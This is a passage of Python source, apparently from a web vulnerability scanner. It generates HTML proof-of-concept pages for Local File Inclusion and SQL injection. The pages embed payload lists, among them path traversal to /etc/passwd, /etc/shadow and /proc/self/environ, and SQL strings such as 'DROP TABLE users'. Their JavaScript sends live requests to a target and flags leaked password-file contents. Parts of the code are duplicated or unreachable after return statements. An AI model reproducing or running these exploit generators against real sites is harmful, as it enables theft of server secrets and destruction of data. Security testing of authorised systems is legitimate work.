        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            method = "GET"
            url = vuln_url
            payload = ""
            
            # Extraer payload de la URL
            from urllib.parse import parse_qs, urlparse
            parsed = urlparse(vuln_url)
            query_params = parse_qs(parsed.query)
            if query_params:
                payload = list(query_params.values())[0][0]
            
            vuln_data.append({
                'index': i,
                'method': method,
                'url': url,
                'payload': payload
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
            option_text = f"{vuln['method']} - {display_url} (Payload: {display_payload})"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Generar el HTML del PoC
        import json
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>LFI PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #e67e22; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #e67e22; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .lfi-payload {{ background: #e67e22; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Local File Inclusion (LFI) PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> LFI vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <div style="text-align: center; margin: 20px 0;">
        <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab (LFI will execute)</button>
        <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
        <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
        <button class="button" onclick="showDetails()">📊 Show Details</button>
    </div>
    
    <div class="result" id="result">
        Select a vulnerability from the dropdown above to start testing...<br><br>
        <strong>Note:</strong> LFI tests may be blocked by server security. Use the "Open in New Tab" button to test manually!
    </div>
    
    <div id="analysis" class="vuln-info" style="display: none;">
        <h3>🔍 LFI Vulnerability Analysis</h3>
        <p><strong>What is LFI?</strong></p>
        <p>Local File Inclusion allows attackers to include files from the local server, potentially exposing sensitive information.</p>
        
        <p><strong>Common Payloads:</strong></p>
        <div class="lfi-payload">../../../etc/passwd</div>
        <div class="lfi-payload">../../../../../../etc/passwd%00</div>
        <div class="lfi-payload">/proc/self/environ</div>
        <div class="lfi-payload">/etc/hosts</div>
        <div class="lfi-payload">/etc/issue</div>
        <div class="lfi-payload">/proc/version</div>
        <div class="lfi-payload">/proc/cmdline</div>
    </div>
    
    <div id="details" class="vuln-info" style="display: none;">
        <h3>📊 Vulnerability Details</h3>
        <p><strong>Total Vulnerabilities Found:</strong> {len(vuln_data)}</p>
        <p><strong>Target Domain:</strong> {base_domain}</p>
        <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const urlBox = document.getElementById('urlBox');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            const vulnDetails = document.getElementById('vulnDetails');
            const selectedUrl = document.getElementById('selectedUrl');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            const vuln = vulnerabilities[vulnIndex];
            
            // Mostrar detalles de la vulnerabilidad
            vulnDetails.innerHTML = `
                <div class="method-badge method-${{vuln.method.toLowerCase()}}">${{vuln.method}}</div>
                <strong>URL:</strong> ${{vuln.url}}<br><br>
                <strong>Payload:</strong><br>
                <div class="payload-box">${{vuln.payload}}</div>
            `;
            
            selectedUrl.textContent = vuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                window.open(vuln.url, '_blank');
            }}
        }}
        
        function copyUrl() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                navigator.clipboard.writeText(vuln.url).then(() => {{
                    alert('URL copied to clipboard!');
                }});
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
    </script>
</body>
</html>"""

        # Guardar el archivo HTML
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_lfi.html"
        html_path = os.path.join(self.output_dir, "poc", html_filename)
        
        # Asegurar que el directorio existe
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ LFI PoC generado: {html_filename}\n")
        sys.stdout.flush()
        
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
        
        # Encontrar el parámetro que contiene el payload LFI
        lfi_param = None
        for param, values in query_params.items():
            if any(lfi_indicator in values[0].lower() for lfi_indicator in ['proc', 'etc', 'passwd', 'environ', 'shadow']):
                lfi_param = param
                break
        
        # Si no encontramos un parámetro LFI, usar 'file' por defecto
        if not lfi_param:
            lfi_param = 'file'
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>LFI PoC - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #e74c3c; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #e74c3c; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .payload {{ background: #2c3e50; color: #ecf0f1; padding: 15px; margin: 15px 0; border-radius: 5px; font-family: monospace; }}
        .analysis {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; display: none; }}
        .file-content {{ background: #fff3cd; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #ffc107; display: none; font-family: monospace; white-space: pre-wrap; }}
        .warning {{ background: #f8d7da; color: #721c24; padding: 10px; border-radius: 5px; margin: 10px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 Local File Inclusion (LFI) PoC</h1>
        <p>Target: <strong>{html.escape(target_url)}</strong></p>
        <p>Method: <strong>{method}</strong></p>
    </div>
    
    <div class="url-box">
        <strong>Vulnerable URL:</strong><br>
        {html.escape(target_url)}
    </div>
    
    <div class="payload">
        <strong>LFI URLs to test:</strong><br>
        <select id="payloadSelect" onchange="updatePayload()" style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: white;">
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../etc/passwd')}">../../../etc/passwd</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../../../../etc/passwd%00')}">../../../../../../etc/passwd%00</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '/proc/self/environ')}">/proc/self/environ</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../etc/shadow')}">../../../etc/shadow</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../etc/hosts')}">../../../etc/hosts</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../etc/issue')}">../../../etc/issue</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../proc/version')}">../../../proc/version</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../proc/cmdline')}">../../../proc/cmdline</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../var/log/apache2/access.log')}">../../../var/log/apache2/access.log</option>
            <option value="{self._generate_lfi_url(target_url, lfi_param, '../../../var/log/nginx/access.log')}">../../../var/log/nginx/access.log</option>
        </select>
        <div id="selectedPayload" style="background: #e74c3c; color: white; padding: 5px; margin: 5px 0; border-radius: 3px; font-family: monospace; word-break: break-all;">
            <strong>Method:</strong> {method}<br>
            <strong>URL:</strong> {self._generate_lfi_url(target_url, lfi_param, '../../../etc/passwd')}
        </div>
    </div>
    
    <button class="button" onclick="openInNewTab()">🔗 Open in New Tab</button>
    <button class="button" onclick="copyUrl()">📋 Copy URL</button>
    <button class="button" onclick="copyPayload()">📋 Copy Payload</button>
    <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
    <button class="button" onclick="showFileContent()">📄 Show File Content</button>
    
    <div id="analysis" class="analysis">
        <h3>🔍 Vulnerability Analysis</h3>
        <p><strong>Vulnerability Type:</strong> Local File Inclusion (LFI)</p>
        <p><strong>Risk Level:</strong> HIGH</p>
        <p><strong>Impact:</strong> Unauthorized access to sensitive files on the server</p>
        <p><strong>Affected Parameter:</strong> File path parameter in URL</p>
        <p><strong>Detection Method:</strong> Path traversal with file inclusion</p>
        <p><strong>Common Files to Access:</strong></p>
        <ul>
            <li>/etc/passwd - User account information</li>
            <li>/proc/self/environ - Environment variables</li>
            <li>/etc/hosts - Host file</li>
            <li>/proc/self/environ - Linux environment variables</li>
        </ul>
        <div class="warning">
            <strong>⚠️ Warning:</strong> This vulnerability allows reading sensitive server files. 
            Use responsibly and only on systems you have permission to test.
        </div>
    </div>
    
    <div id="fileContent" class="file-content">
        <h3>📄 Real File Content Response</h3>
        <p><em>Click the button below to fetch the actual response from the vulnerable server:</em></p>
        <button class="button" onclick="fetchRealResponse()" style="background: #e67e22;">🔄 Fetch Real Response</button>
        <div id="realResponse" style="background: #2c3e50; color: #ecf0f1; padding: 10px; border-radius: 3px; margin-top: 10px; display: none;">
            <div id="responseContent">Loading...</div>
        </div>
        <div id="responseInfo" style="margin-top: 10px; display: none;">
            <p><strong>Response Status:</strong> <span id="statusCode"></span></p>
            <p><strong>Response Size:</strong> <span id="responseSize"></span> bytes</p>
            <p><strong>Response Time:</strong> <span id="responseTime"></span> ms</p>
        </div>
    </div>
    
    <script>
        function updatePayload() {{
            const select = document.getElementById('payloadSelect');
            const display = document.getElementById('selectedPayload');
            display.textContent = select.value;
        }}
        
        function copyPayload() {{
            const select = document.getElementById('payloadSelect');
            const payload = select.value;
            navigator.clipboard.writeText(payload).then(function() {{
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying payload: ', err);
                const textArea = document.createElement('textarea');
                textArea.value = payload;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            if (analysis.style.display === 'none' || analysis.style.display === '') {{
                analysis.style.display = 'block';
            }} else {{
                analysis.style.display = 'none';
            }}
        }}
        
        function showFileContent() {{
            const fileContent = document.getElementById('fileContent');
            if (fileContent.style.display === 'none' || fileContent.style.display === '') {{
                fileContent.style.display = 'block';
            }} else {{
                fileContent.style.display = 'none';
            }}
        }}
        
        async function fetchRealResponse() {{
            const button = event.target;
            const responseContent = document.getElementById('responseContent');
            const realResponse = document.getElementById('realResponse');
            const responseInfo = document.getElementById('responseInfo');
            
            // Cambiar estado del botón
            button.textContent = '⏳ Fetching...';
            button.disabled = true;
            button.style.background = '#95a5a6';
            
            try {{
                // Mostrar área de respuesta
                realResponse.style.display = 'block';
                responseInfo.style.display = 'block';
                
                // Crear URL con payload LFI
                const baseUrl = '{target_url}';
                let testUrl = baseUrl;
                
                // Detectar si es una vulnerabilidad de formulario
                const isFormVulnerability = baseUrl.includes('blog/profile/') || baseUrl.includes('search') || baseUrl.includes('blog/');
                
                if (isFormVulnerability) {{
                    // Para formularios, usar el primer parámetro disponible
                    const lfiPayload = '../../../etc/passwd';
                    if (baseUrl.includes('?')) {{
                        testUrl = baseUrl + '&nonce=' + encodeURIComponent(lfiPayload);
                    }} else {{
                        testUrl = baseUrl + '?nonce=' + encodeURIComponent(lfiPayload);
                    }}
                }} else {{
                    // Para URLs normales, agregar parámetro file
                    if (baseUrl.includes('?')) {{
                        testUrl = baseUrl + '&file=' + encodeURIComponent('../../../etc/passwd');
                    }} else {{
                        testUrl = baseUrl + '?file=' + encodeURIComponent('../../../etc/passwd');
                    }}
                }}
                
                const startTime = Date.now();
                
                // Hacer petición real al servidor
                const response = await fetch(testUrl, {{
                    method: '{method}',
                    headers: {{
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate',
                        'Connection': 'keep-alive',
                    }}
                }});
                
                const responseTime = Date.now() - startTime;
                const responseText = await response.text();
                
                // Mostrar información de la respuesta
                document.getElementById('statusCode').textContent = response.status + ' ' + response.statusText;
                document.getElementById('responseSize').textContent = responseText.length;
                document.getElementById('responseTime').textContent = responseTime;
                
                // Mostrar contenido de la respuesta
                if (responseText.includes('root:x:') || responseText.includes('daemon:x:') || responseText.includes('bin:x:')) {{
                    responseContent.innerHTML = '<span style="color: #e74c3c;">🚨 LFI VULNERABILITY CONFIRMED!</span><br><br>' + 
                        responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 2000);
                }} else if (responseText.includes('error') || responseText.includes('404') || responseText.includes('403')) {{
                    responseContent.innerHTML = '<span style="color: #f39c12;">⚠️ File access blocked or error</span><br><br>' + 
                        responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 1000);
                }} else {{
                    responseContent.innerHTML = '<span style="color: #3498db;">📄 Response received</span><br><br>' + 
                        responseText.replace(/</g, '&lt;').replace(/>/g, '&gt;').substring(0, 1000);
                }}
                
            }} catch (error) {{
                responseContent.innerHTML = '<span style="color: #e74c3c;">❌ Error: ' + error.message + '</span>';
                document.getElementById('statusCode').textContent = 'Error';
                document.getElementById('responseSize').textContent = '0';
                document.getElementById('responseTime').textContent = '0';
            }} finally {{
                // Restaurar botón
                button.textContent = '🔄 Fetch Real Response';
                button.disabled = false;
                button.style.background = '#e67e22';
            }}
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            window.open(url, '_blank');
        }}
        
        function copyUrl() {{
            const select = document.getElementById('payloadSelect');
            const url = select.value;
            navigator.clipboard.writeText(url).then(function() {{
                // Opcional: mostrar feedback
                const button = event.target;
                const originalText = button.textContent;
                button.textContent = '✅ Copied!';
                setTimeout(() => {{
                    button.textContent = originalText;
                }}, 2000);
            }}).catch(function(err) {{
                console.error('Error copying URL: ', err);
                // Fallback: usar método alternativo
                const textArea = document.createElement('textarea');
                textArea.value = url;
                document.body.appendChild(textArea);
                textArea.select();
                document.execCommand('copy');
                document.body.removeChild(textArea);
            }});
        }}
    </script>
</body>
</html>
        """
        
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_lfi.html"
        html_path = os.path.join(self.poc_dir, html_filename)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ LFI PoC generado: {html_filename}\n")
        sys.stdout.flush()
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
    
    def generate_sqli_poc(self, vulnerable_urls, screenshot=False, domain=None):
        """Genera PoC para SQL Injection con múltiples URLs vulnerables"""
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        # Crear un hash único basado en las URLs para evitar sobrescribir PoCs
        import hashlib
        urls_str = '|'.join(vulnerable_urls)
        url_hash = hashlib.md5(urls_str.encode()).hexdigest()[:8]
        
        # Extraer el dominio base de la primera URL
        from urllib.parse import urlparse
        if vulnerable_urls:
            base_domain = urlparse(vulnerable_urls[0]).netloc
        else:
            base_domain = "unknown"
        
        # Procesar las URLs vulnerables
        vuln_data = []
        for i, vuln_url in enumerate(vulnerable_urls):
            method = "GET"
            url = vuln_url
            payload = ""
            form_data = None
            
            # Si es un formulario, extraer datos
            if ' => ' in vuln_url:
                method = "POST"
                url_part = vuln_url.split(' => ')[0]
                url = url_part.split()[0]
                form_part = vuln_url.split(' => ')[1]
                try:
                    import ast
                    form_data = ast.literal_eval(form_part)
                    # Extraer payload del primer campo del formulario
                    if form_data:
                        payload = list(form_data.values())[0]
                except:
                    form_data = {}
            else:
                # Extraer payload de la URL
                from urllib.parse import parse_qs, urlparse
                parsed = urlparse(vuln_url)
                query_params = parse_qs(parsed.query)
                if query_params:
                    payload = list(query_params.values())[0][0]
            
            vuln_data.append({
                'index': i,
                'method': method,
                'url': url,
                'payload': payload,
                'form_data': form_data
            })
        
        # Generar opciones del dropdown
        dropdown_options = []
        for vuln in vuln_data:
            display_url = vuln['url'][:60] + "..." if len(vuln['url']) > 60 else vuln['url']
            display_payload = vuln['payload'][:30] + "..." if len(vuln['payload']) > 30 else vuln['payload']
            option_text = f"{vuln['method']} - {display_url} (Payload: {display_payload})"
            dropdown_options.append(f'<option value="{vuln["index"]}">{option_text}</option>')
        
        dropdown_html = '\n'.join(dropdown_options)
        
        # Generar el HTML del PoC
        import json
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection PoC - {base_domain}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #9b59b6; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #9b59b6; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .button:hover {{ background: #2980b9; }}
        .button:disabled {{ background: #bdc3c7; cursor: not-allowed; }}
        .result {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border: 2px solid #f39c12; }}
        .dropdown-container {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #3498db; }}
        .dropdown {{ width: 100%; padding: 10px; border: 1px solid #bdc3c7; border-radius: 5px; font-size: 14px; }}
        .vuln-info {{ background: #f8f9fa; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #28a745; }}
        .method-badge {{ display: inline-block; padding: 4px 8px; border-radius: 3px; font-size: 12px; font-weight: bold; margin-right: 10px; }}
        .method-get {{ background: #27ae60; color: white; }}
        .method-post {{ background: #e74c3c; color: white; }}
        .payload-box {{ background: #e74c3c; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
        .sqli-payload {{ background: #9b59b6; color: white; padding: 5px; border-radius: 3px; font-family: monospace; margin: 5px 0; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 SQL Injection PoC</h1>
        <p>Target: <strong>{base_domain}</strong></p>
        <p>Found <strong>{len(vuln_data)}</strong> SQL Injection vulnerabilities</p>
    </div>
    
    <div class="dropdown-container">
        <h3>🔍 Select Vulnerability to Test</h3>
        <select class="dropdown" id="vulnSelect" onchange="selectVulnerability()">
            <option value="">Choose a vulnerability...</option>
            {dropdown_html}
        </select>
    </div>
    
    <div id="vulnInfo" class="vuln-info" style="display: none;">
        <h3>📊 Selected Vulnerability Details</h3>
        <div id="vulnDetails"></div>
    </div>
    
    <div class="url-box" id="urlBox" style="display: none;">
        <strong>Vulnerable URL:</strong><br>
        <span id="selectedUrl"></span>
    </div>
    
    <div style="text-align: center; margin: 20px 0;">
        <button class="button" onclick="openInNewTab()" id="openBtn" disabled>🔗 Open in New Tab (SQLi will execute)</button>
        <button class="button" onclick="copyUrl()" id="copyBtn" disabled>📋 Copy URL</button>
        <button class="button" onclick="showAnalysis()">🔍 Show Analysis</button>
        <button class="button" onclick="showDetails()">📊 Show Details</button>
    </div>
    
    <div class="result" id="result">
        Select a vulnerability from the dropdown above to start testing...<br><br>
        <strong>Note:</strong> SQL Injection tests may be blocked by WAF. Use the "Open in New Tab" button to test manually!
    </div>
    
    <div id="analysis" class="vuln-info" style="display: none;">
        <h3>🔍 SQL Injection Vulnerability Analysis</h3>
        <p><strong>What is SQL Injection?</strong></p>
        <p>SQL Injection allows attackers to manipulate database queries by injecting malicious SQL code through user input.</p>
        
        <p><strong>Common Payloads:</strong></p>
        <div class="sqli-payload">' OR 1=1 --</div>
        <div class="sqli-payload">' UNION SELECT 1,2,3 --</div>
        <div class="sqli-payload">' AND 1=2 --</div>
        <div class="sqli-payload">'; DROP TABLE users --</div>
        <div class="sqli-payload">' OR '1'='1</div>
        <div class="sqli-payload">' OR 1=1#</div>
        <div class="sqli-payload">' OR 1=1/*</div>
        <div class="sqli-payload">' UNION SELECT NULL,NULL,NULL--</div>
    </div>
    
    <div id="details" class="vuln-info" style="display: none;">
        <h3>📊 Vulnerability Details</h3>
        <p><strong>Total Vulnerabilities Found:</strong> {len(vuln_data)}</p>
        <p><strong>Target Domain:</strong> {base_domain}</p>
        <p><strong>Scan Date:</strong> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        
        <h4>Vulnerability Breakdown:</h4>
        <ul>
            <li><strong>GET Requests:</strong> {len([v for v in vuln_data if v['method'] == 'GET'])}</li>
            <li><strong>POST Requests:</strong> {len([v for v in vuln_data if v['method'] == 'POST'])}</li>
        </ul>
    </div>

    <script>
        const vulnerabilities = {json.dumps(vuln_data)};
        
        function selectVulnerability() {{
            const select = document.getElementById('vulnSelect');
            const vulnInfo = document.getElementById('vulnInfo');
            const urlBox = document.getElementById('urlBox');
            const openBtn = document.getElementById('openBtn');
            const copyBtn = document.getElementById('copyBtn');
            const vulnDetails = document.getElementById('vulnDetails');
            const selectedUrl = document.getElementById('selectedUrl');
            
            if (select.value === '') {{
                vulnInfo.style.display = 'none';
                urlBox.style.display = 'none';
                openBtn.disabled = true;
                copyBtn.disabled = true;
                return;
            }}
            
            const vulnIndex = parseInt(select.value);
            const vuln = vulnerabilities[vulnIndex];
            
            // Mostrar detalles de la vulnerabilidad
            vulnDetails.innerHTML = `
                <div class="method-badge method-${{vuln.method.toLowerCase()}}">${{vuln.method}}</div>
                <strong>URL:</strong> ${{vuln.url}}<br><br>
                <strong>Payload:</strong><br>
                <div class="payload-box">${{vuln.payload}}</div>
            `;
            
            selectedUrl.textContent = vuln.url;
            
            vulnInfo.style.display = 'block';
            urlBox.style.display = 'block';
            openBtn.disabled = false;
            copyBtn.disabled = false;
        }}
        
        function openInNewTab() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                window.open(vuln.url, '_blank');
            }}
        }}
        
        function copyUrl() {{
            const select = document.getElementById('vulnSelect');
            if (select.value !== '') {{
                const vulnIndex = parseInt(select.value);
                const vuln = vulnerabilities[vulnIndex];
                navigator.clipboard.writeText(vuln.url).then(() => {{
                    alert('URL copied to clipboard!');
                }});
            }}
        }}
        
        function showAnalysis() {{
            const analysis = document.getElementById('analysis');
            analysis.style.display = analysis.style.display === 'none' ? 'block' : 'none';
        }}
        
        function showDetails() {{
            const details = document.getElementById('details');
            details.style.display = details.style.display === 'none' ? 'block' : 'none';
        }}
    </script>
</body>
</html>"""

        # Guardar el archivo HTML
                # Usar el dominio proporcionado o extraer de la primera URL
        if domain:
            base_domain = domain
            clean_domain = base_domain.replace(':', '_').replace('/', '_').replace('\\', '_')
        else:
            # Extraer el dominio base de la primera URL
            from urllib.parse import urlparse
            if vulnerable_urls:
                base_domain = urlparse(vulnerable_urls[0]).netloc
                clean_domain = base_domain.replace('www.', '').replace('.', '_')
            else:
                base_domain = "unknown"
                clean_domain = "unknown"
        
        # Crear nombre de archivo basado en el dominio
        html_filename = f"{clean_domain}_sqli.html"
        html_path = os.path.join(self.output_dir, "poc", html_filename)
        
        # Asegurar que el directorio existe
        os.makedirs(os.path.dirname(html_path), exist_ok=True)
        
        with open(html_path, 'w', encoding='utf-8') as f:
            f.write(html_content)
        
        sys.stdout.write(f"✅ SQLi PoC generado: {html_filename}\n")
        sys.stdout.flush()
        
        return {
            'html_path': html_path,
            'screenshot_path': None,
            'html_filename': html_filename,
            'screenshot_filename': None
        }
        
        html_content = f"""
<!DOCTYPE html>
<html>
<head>
    <title>SQL Injection PoC - {target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; margin: 20px; background: #f5f5f5; }}
        .header {{ background: #9b59b6; color: white; padding: 20px; border-radius: 5px; text-align: center; }}
        .url-box {{ background: white; padding: 15px; margin: 15px 0; border-radius: 5px; border-left: 5px solid #9b59b6; }}
        .button {{ background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; margin: 5px; }}
        .payload {{ background: #2c3e50; color: #ecf0f1; padding: 15px; margin: 15px 0; border-radius: 5px; font-family: monospace; }}
    </style>
</head>
<body>
    <div class="header">
        <h1>🚨 SQL Injection PoC</h1>
        <p>Target: <strong>{html.escape(target_url)}</strong></p>
        <p>Method: <strong>{method}</strong></p>
    </div>
    
    <div class="url-box">
        <strong>Vulnerable URL:</strong><br>
        {html.escape(target_url)}
    </div>
    
    {form_html}
    
    <div class="payload">
        <strong>SQLi URLs to test:</strong><br>
        <select id="payloadSelect" onchange="updatePayload()" style="width: 100%; padding: 8px; margin: 10px 0; border: 1px solid #ddd; border-radius: 4px; background: white;">
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1 --")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1 --")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT 1,2,3 --")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' UNION SELECT 1,2,3 --")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' AND 1=2 --")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' AND 1=2 --")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "'; DROP TABLE users --")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "'; DROP TABLE users --")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR '1'='1")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR '1'='1")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1#")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1#")}</option>
            <option value="{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1/*")}">{target_url.replace('PAYLOAD_PLACEHOLDER', "' OR 1=1/*")}</option>
